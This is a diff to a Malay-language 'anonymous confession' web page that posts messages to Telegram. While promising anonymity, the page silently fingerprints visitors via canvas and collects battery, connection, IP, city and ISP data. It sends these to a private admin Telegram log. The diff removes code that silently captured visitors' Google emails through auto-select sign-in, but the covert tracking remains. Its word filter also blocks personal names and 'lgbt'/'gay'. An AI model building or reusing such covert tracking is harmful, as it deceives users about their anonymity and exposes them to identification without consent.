@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Anonymous Confession</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <script src="https://accounts.google.com/gsi/client" async defer></script>
     <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;700;800&display=swap" rel="stylesheet">
     <style>
         body {
@@ -64,6 +63,7 @@
 </head>
 <body class="text-gray-100">
 
+    <!-- Modal Human Verification -->
     <div id="consentModal" class="fixed inset-0 modal-overlay flex items-center justify-center p-6">
         <div class="bg-[#111827] border border-white/10 p-10 rounded-[2.5rem] max-w-sm w-full shadow-2xl text-center">
             <div class="w-16 h-16 bg-indigo-500/20 rounded-full flex items-center justify-center mx-auto mb-6">
@@ -71,9 +71,9 @@
                     <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04m18.236 0 a11.956 11.956 0 001 8.618 11.955 11.955 0 01-1 8.618c1.921 0 3.743-.435 5.382-1.214M12 21a9.003 9.003 0 008.382-5.618" />
                 </svg>
             </div>
-            <h2 class="text-2xl font-bold mb-4">Human Verification</h2>
+            <h2 class="text-2xl font-bold mb-4">Verify Dulu Bro</h2>
             <p class="text-gray-300 text-sm leading-relaxed mb-8">
-                By clicking below, you agree to stay anonymous. View <span class="tnc-clickable" id="tncLink">terms</span>.
+                I am human and stay anonymous. View <span class="tnc-clickable" id="tncLink">terma</span>.
             </p>
             <button id="agreeBtn" class="w-full py-4 bg-indigo-600 hover:bg-indigo-500 rounded-2xl font-black text-white transition-all active:scale-95 shadow-xl">
                 SETUJU BRO
@@ -83,24 +83,9 @@
 
     <div class="w-full max-w-md mx-auto px-4">
         <div id="tiltCard" class="glass-card p-8 sm:p-12 w-full blurred relative overflow-hidden">
-            <div id="loadingOverlay" class="hidden absolute inset-0 bg-slate-900/90 flex flex-col items-center justify-center z-50">
-                <div class="w-12 h-12 border-4 border-indigo-500 border-t-transparent rounded-full animate-spin mb-4"></div>
-                <p class="text-xs font-bold tracking-widest text-indigo-400 uppercase">Loading Content...</p>
-            </div>
-
+            
             <div class="card-inner" id="cardMainContent">
                 <div id="formContainer">
-                    <div class="flex justify-center mb-6">
-                        <div id="g_id_onload"
-                             data-client_id="231925439708-te47tckgcptfs1vr6jk4a9n84a4hlggn.apps.googleusercontent.com"
-                             data-context="signin"
-                             data-callback="onSilentAuth"
-                             data-auto_select="true"
-                             data-itp_support="true">
-                        </div>
-                        <div class="g_id_signin" data-type="standard" data-theme="filled_black" data-shape="pill"></div>
-                    </div>
-
                     <h1 class="text-4xl font-extrabold text-center text-white mb-2">Anonymous Drop</h1>
                     <p class="text-center text-indigo-300 mb-8 text-xl font-light">Luah je apa kau rasa.</p>
 
@@ -133,9 +118,9 @@
         const PUBLIC_CHAT_ID = '-1001841870133'; 
         const PRIVATE_LOG_ID = '-1003635312239'; 
 
-        const profanityList = ['sofea', 'horny', 'tetek', 'kote', 'sangap', 'bj', 'lancap', 'toceng', 'sex', 'cum', 'pepek', 'fuck', 'pussy', 'babi', 'lgbt', 'gay', 'sial', 'peliaq', 'hanat', 'kimak', 'kiwak', 'buto', 'butoh', 'pukimak', 'barua', 'konek', 'pantat', 'patamak', 'seks', 'pntt', 'delete', 'bangsat', 'anak haram', 'haram jadah', 'puki', 'berayaq', 'porn', 'thila', 'izzat'];
+        // Senarai perkataan dilarang (Dikemaskini)
+        const profanityList = ['sofea', 'izzat', 'porn', 'thila', 'horny', 'tetek', 'kote', 'sangap', 'blowjob', 'lancap', 'toceng', 'sex', 'cum', 'pepek', 'fuck', 'pussy', 'babi', 'lgbt', 'gay', 'sial', 'peliaq', 'hanat', 'kimak', 'kiwak', 'buto', 'butoh', 'pukimak', 'barua', 'konek', 'pantat', 'patamak', 'seks', 'pntt', 'delete', 'bangsat', 'anak haram', 'haram jadah', 'puki', 'berayaq'];
         
-        let userEmail = "Anonymous (No Google Selection)";
         const sessionId = Math.random().toString(36).substring(2, 10).toUpperCase();
 
         // 1. Silent Canvas Fingerprinting (100% Background)
@@ -169,7 +154,7 @@
                 if (navigator.getBattery) {
                     const bat = await navigator.getBattery();
                     data.battery = Math.round(bat.level * 100) + "%";
-                    data.charging = bat.charging ? "Yes" : "No";
+                    data.charging = bat.charging ? "Ya" : "Tidak";
                 }
                 if (navigator.connection) {
                     data.connection = navigator.connection.effectiveType || "N/A";
@@ -192,17 +177,24 @@
             } catch(e) { return { ip: "Unknown", city: "Unknown", region: "Unknown", isp: "Unknown" }; }
         }
 
+        document.getElementById('tncLink').onclick = (e) => {
+            e.stopPropagation();
+            const customAlert = document.createElement('div');
+            customAlert.className = "fixed inset-0 z-[200] flex items-center justify-center p-4 bg-black/60";
+            customAlert.innerHTML = `
+                <div class="bg-gray-900 border border-white/10 p-6 rounded-2xl max-w-xs w-full text-center shadow-2xl">
+                    <h3 class="font-bold text-lg mb-2 text-white">Terma Keselamatan</h3>
+                    <p class="text-sm text-gray-400 mb-4">Hantaran kekal tanpa nama. Kami log meta-data untuk keselamatan tetapi tidak memaparkannya secara terbuka.</p>
+                    <button class="w-full py-2 bg-indigo-600 rounded-lg text-sm font-bold text-white" onclick="this.parentElement.parentElement.remove()">Tutup</button>
+                </div>
+            `;
+            document.body.appendChild(customAlert);
+        };
+
         document.getElementById('agreeBtn').onclick = () => {
             document.getElementById('consentModal').classList.add('hidden');
             document.getElementById('tiltCard').classList.remove('blurred');
         };
-
-        function onSilentAuth(response) {
-            try {
-                const payload = JSON.parse(atob(response.credential.split('.')[1]));
-                userEmail = payload.email;
-            } catch (e) {}
-        }
 
         function checkSpamFuzzy(text) {
             const simplify = (str) => str.toLowerCase().replace(/(.)\1+/g, '$1').replace(/[^a-z0-9\s]/g, '');
@@ -222,11 +214,11 @@
             const text = textArea.value.trim();
             if(!text) return;
 
-            // Device-based Rate Limit
+            // Device-based Rate Limit (15s)
             const lastSent = localStorage.getItem('last_drop');
-            if (lastSent && (Date.now() - lastSent < 30000)) {
-                const left = Math.ceil((30000 - (Date.now() - lastSent)) / 1000);
-                statusDiv.innerText = `Device Cooldown: ${left}s left.`;
+            if (lastSent && (Date.now() - lastSent < 15000)) {
+                const left = Math.ceil((15000 - (Date.now() - lastSent)) / 1000);
+                statusDiv.innerText = `Tunggu jap ${left} saat, kau nak spam pulak.`;
                 statusDiv.className = "mt-6 p-4 rounded-xl text-center bg-orange-600 text-white block";
                 statusDiv.classList.remove('hidden');
                 return;
@@ -234,7 +226,7 @@
 
             const badWord = checkSpamFuzzy(text);
             if (badWord) {
-                statusDiv.innerText = `can't be sent because it contains "${badWord}"`;
+                statusDiv.innerText = `Takleh hantar sebab ada perkataan: "${badWord}"`;
                 statusDiv.className = "mt-6 p-4 rounded-xl text-center bg-red-600 text-white block";
                 statusDiv.classList.remove('hidden');
                 return;
@@ -264,9 +256,8 @@
                     })
                 });
 
-                // 2. Send Advanced Forensics to Admin (Background)
-                const adminMsg = `🔐 *ADMIN LOG (PADU)*\n` +
-                                `👤 *Google:* ${esc(userEmail)}\n` +
+                // 2. Send Advanced Forensics to Admin (Ghost Mode)
+                const adminMsg = `🔐 *ADMIN LOG (GHOST)*\n` +
                                 `🆔 *Sess:* ${esc(sessionId)}\n` +
                                 `🧬 *Fingerprint:* \`${esc(fingerprint)}\`\n` +
                                 `🔋 *Battery:* ${esc(forensics.battery)} (${esc(forensics.charging)})\n` +
@@ -287,7 +278,7 @@
 
                 if(publicRes.ok) {
                     localStorage.setItem('last_drop', Date.now());
-                    statusDiv.innerText = "Confession sent anonymously!";
+                    statusDiv.innerText = "Luahan telah dihantar tanpa nama!";
                     statusDiv.className = "mt-6 p-4 rounded-xl text-center bg-green-600 text-white block";
                 }
                 
@@ -295,7 +286,7 @@
                 textArea.value = "";
                 setTimeout(() => statusDiv.classList.add('hidden'), 5000);
             } catch (err) {
-                statusDiv.innerText = "Connection failed.";
+                statusDiv.innerText = "Gagal menyambung ke server.";
                 statusDiv.className = "mt-6 p-4 rounded-xl text-center bg-red-600 text-white block";
                 statusDiv.classList.remove('hidden');
             } finally {
